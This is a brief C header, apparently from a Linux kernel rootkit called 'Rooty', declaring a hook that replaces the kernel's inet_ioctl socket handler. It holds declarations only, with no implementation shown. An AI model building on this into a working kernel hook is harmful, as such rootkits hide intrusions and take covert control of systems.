#ifndef ROOTY_IOCTL_HANDLER_H
#define ROOTY_IOCTL_HANDLER_H

#include <linux/net.h>

extern int (*inet_ioctl)(struct socket *, unsigned int, unsigned long);

void *get_inet_ioctl(int family, int type, int protocol);
long n_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg);

#endif /* ROOTY_IOCTL_HANDLER_H */
